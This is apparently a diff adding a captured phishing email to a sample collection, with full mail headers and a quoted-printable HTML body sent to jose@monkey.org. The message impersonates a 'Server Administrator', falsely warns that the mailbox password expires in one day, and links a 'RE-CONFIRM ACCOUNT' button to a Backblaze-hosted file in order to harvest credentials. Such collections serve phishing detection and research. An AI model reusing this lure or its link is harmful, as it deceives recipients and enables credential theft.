@@ -1,0 +1,127 @@
+Return-Path: info@exalplast.com
+Delivered-To: jose@monkey.org
+X-FDA: 81687698442.25.AF4A497
+Received: from sxb1plsmtpa01-09.prod.sxb1.secureserver.net
+ (sxb1plsmtpa01-09.prod.sxb1.secureserver.net [188.121.53.98])	by
+ imf18.b.hostedemail.com (Postfix) with ESMTP id 11A45120009	for
+ <jose@monkey.org>; Wed, 17 Jan 2024 05:38:39 +0000 (UTC)
+Authentication-Results: imf18.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=softfail (imf18.b.hostedemail.com: 188.121.53.98 is neither permitted nor
+ denied by domain of info@exalplast.com) smtp.mailfrom=info@exalplast.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1705469920;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=ywHXPQDJgxQEpoD+ePVMFdfpA+zr1UZyehyuaNHnz5M=;
+	b=YOqoihxe1DxmKJ/H1XFN7dcskhNjpBxq5FMQ4Jy5Gdr19x4DdrRCZjwnOSgCaARq7v3iKF
+	KFa9punPMh9STxFNDeG8+Tfua4riJfd05jZwtw2gtR6d0ZLBUsnMQVN3VYDhvtlh6C37EF
+	SftEiYUQ05Xrh/3jFegCTj4XOLVeAVA=
+ARC-Authentication-Results: i=1;	imf18.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=softfail (imf18.b.hostedemail.com: 188.121.53.98 is neither
+ permitted nor denied by domain of info@exalplast.com)
+ smtp.mailfrom=info@exalplast.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1705469920; a=rsa-sha256;
+	cv=none;
+	b=gc1sm8KhH0VEVMaRFWT7TylHWzPwrpvPsiKRUYPM3TIBEG5nlCoEkCWxLLl17OrrK8tFYV
+	BEdfrSO+YmjvC5JJNjTP1JjyMzinzup87X5f3xoOMETJigMhNvYC1qiqSbQKff3JJTvx2H
+	rmqJ/PNLKa7taJJaj8o3FfCG38WhvLM=
+Received: from exalplast.com ([102.90.57.91])
+	by :SMTPAUTH: with ESMTPA
+	id Pyd5rXRqwMGM2PyderV6ng; Tue, 16 Jan 2024 22:39:00 -0700
+X-SECURESERVER-ACCT: david@rosmount.com
+From: Server Administrator - monkey.org <info@exalplast.com>
+To: jose@monkey.org
+Subject: monkey.org is due to expire in 1 day
+Date: 17 Jan 2024 00:38:32 -0500
+Message-ID: <20240117003832.03D12485966149A0@exalplast.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-CMAE-Envelope: =?utf-8?q?MS4xfGiRAjcGWzWqgVbS8vZ06nL8EoaC+6esYQ3g5stXQV17N?=
+ =?utf-8?q?n1jGe2Fv9u0ZI+BaQW/eyqhFE0qMRR0gUlrmKvHaVQb2iYlumoqjwAQJ9v22UFQQF?=
+ =?utf-8?q?dkcbbQ_SqU4ciwrunWXEpkZ1C20G8GwP9jj1co8T+M5RRQUDgZ8R3AmHRbT548Eaw?=
+ =?utf-8?q?AcJAOrW1GSV+QXG4VMtg=3D=3D?=
+X-Rspamd-Queue-Id: 11A45120009
+X-Stat-Signature: 3qoepc9gwg1c7t7445i4z9371367es8p
+X-Rspam-User: 
+X-Spam-Status: No, score=4.70
+X-Rspamd-Server: rspam07
+X-CMAE-Analysis: v=2.4 cv=Ud1XSrSN c=1 sm=1 tr=0 ts=65a767e0
+	a=i9gnFJ//eXO588HLcZbK3g==:117 a=EVonCV/48fXsjsVUv+DQqg==:17
+	a=T-PJXEmqAAAA:8 a=sbqGhzo7vaogXqIfg0wwtJZuoPc=:19 a=J7cCCj5zn_ZCFutf:21
+	a=8nJEP1OIZ-IA:10 a=dEuoMetlWLkA:10 a=i34lBqjgAAAA:20
+	a=_HbB68nQasJGZvLtem4A:9 a=exz0IyzqZaoCc8o-:21 a=frz4AuCg-hUA:10
+	a=_W_S_7VecoQA:10 a=wPNLvfGTeEIA:10 a=RVmHIydaz68A:10
+	a=TLMVSm3AIi2ufbynrBM0:22
+X-HE-Tag: 1705469919-409557
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+WHZ1rH6pWoRKdfvKrzPo7XK5lPxmJseLMlRmdM8lmylC?=
+ =?utf-8?q?8tCMJLBCG+XaPsHLrvWkWxIa9zR8ySu7tf7N6vxDjvhyMAgtJnZLiS4ZhbW/i8ZIL?=
+ =?utf-8?q?YlwBslmq7WuGGuVWD24gXStm4mL0CfbqtAIE8e3zcDiqiFRoS7oFowgtykBs47aw0?=
+ =?utf-8?q?5aGNdl134IF88tkPK/yDiDTZnd1L+HCGz+gskLNwJRlYmB+PWXGqm7H+xZhm4Dubc?=
+ =?utf-8?q?Mt/7mBfSwTY3THgCUxNMP1bdN6l4NItD0RRDuMxd70GUh78+4Af72i2eBb4/X4QJC?=
+ =?utf-8?q?Mws0de/tzTTpyA+78xbqv4Lqs622w1772uRIuhu6hXegjns6ph+BPAeLTd10re4N0?=
+ =?utf-8?q?EQquhQjFAchb1WTFHsaaxOH6cK3Z8xRY8XTeJNeHAqlF22Bot7tTuVufKn75uK2BS?=
+ =?utf-8?q?6RZeB19zA/5AjKu+FTaaMY9TwEUFrHVmE4iFY4OevHAJQTNXfwnuC4Y0sqHr4Ztrf?=
+ =?utf-8?q?/U1ijGXnafwy6QDdpy+a9ZoZ0CGtb1PRHFcFnk892Z+E897T63qLsZAwAeurBy25Q?=
+ =?utf-8?q?o9J309bGOjz24ALyLO6vJsuIZ8dF7JGCJvvXCjltbxZnptxbsXlVCBt0jjjHspy/4?=
+ =?utf-8?q?2CiVEkdT+ff7vnZVE47h0JZ19quZO+SQ6MTUARtsWIYB2UvE3fku9tMA+l03tSbKX?=
+ =?utf-8?q?SoPfuailkCiNkHScd0ScmYzxXh1sPrS9lowKQBoXLOO3++Qucv1yNCRQk2gKfHbnv?=
+ =?utf-8?q?5PzCz4nmraqjELpFbCmSeAiocfBU3ELKbwnpmEXM1OVbSNOBb0hSFCyCast1017Wa?=
+ =?utf-8?q?AVFwgGG1Ms9SebZA3UHzpoaVbDDnVjL85YWDWwI/jQ4j5Hz4V+39hjD4Ct6hIhFs0?=
+ =?utf-8?q?W4vv28bYtGoWziapOV+Y/c4CsntpUGA+R12lYUCmOdCOwrbk8DaRodDQQ/AgXmghv?=
+ =?utf-8?q?7YA+AwlJZ2sBszuUYOfdnA_/XAVJtyQr5cjLXOdWZJNbYYB2TwumUe8dcb0QnxQqd?=
+ =?utf-8?q?BkbLXRPAwfNZ3oxHw6ZwBxn/U8j68wpEf3TjFAapNYmQWyS8Q=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 27
+
+<html><head>
+<style type=3D"text/css">#editbody1 .v1style1 { color: #FFFFFF; }
+#editbody1 .v1style3 { font-size: 18px; }</style>
+
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div id=3D"editbody1">
+<div style=3D"margin: 0.5em;">
+<div class=3D"v1style3" dir=3D"ltr"><font size=3D"2">Hello&nbsp;jose,</font=
+></div><font size=3D"2">
+</font><div class=3D"v1style3" dir=3D"ltr"><font size=3D"2">
+</font><div><font size=3D"2">
+</font><div dir=3D"ltr"><font size=3D"2">
+</font><div><br><font size=3D"2">Just wanted to give you a heads up that th=
+e password for your mailbox&nbsp;<span style=3D"color: rgb(31, 21, 234);">j=
+ose@monkey.org</span>&nbsp;is set to expire in 1 day.</font></div><font siz=
+e=3D"2">
+</font><div><br><font size=3D"2">To prevent any interruptions, please make =
+sure to reconfirm your account within the next 24 hours. <br><br>Our system=
+ will automatically log you out if you fail to reconfirm your account befor=
+e the expiration time. <br><br></font></div><font size=3D"2">
+</font><div><font size=3D"2">
+</font><font size=3D"2">
+</font><font size=3D"2">
+</font><font size=3D"2">
+</font><table width=3D"400" bgcolor=3D"#424242"><tbody><tr><td><font size=
+=3D"2">
+</font><div align=3D"center"><a title=3D"This external link will open in a =
+new window" class=3D"v1style1" href=3D"https://f003.backblazeb2.com/b2api/v=
+1/b2_download_file_by_id?fileId=3D4_z0683af83d95b185d8bd50210_f118215002e16=
+87cb_d20240117_m051233_c003_v0312023_t0010_u01705468353896#jose@monkey.org"=
+ target=3D"_blank" rel=3D"noopener noreferrer"><font size=3D"2"><strong>RE-=
+CONFIRM ACCOUNT</strong></font></a></div></td></tr></tbody></table></div><f=
+ont size=3D"2">
+</font><div><br><font size=3D"2">Once you've completed the confirmation pro=
+cess, your email account will continue to work effectively.<br><br>If you h=
+ave any questions or need assistance during this process, please don't hesi=
+tate to reach out to our support team. We're here to help!<br><br>Thank you=
+ for your attention to this matter, and we appreciate your continued partne=
+rship.<br><br></font></div><font size=3D"2">
+</font><div><font size=3D"2">Copyright&nbsp; <span style=3D"color: rgb(31, =
+21, 234);">monkey.org</span> 2024 All rights reserved.</font></div></div></=
+div></div></div></div></body></html>
+
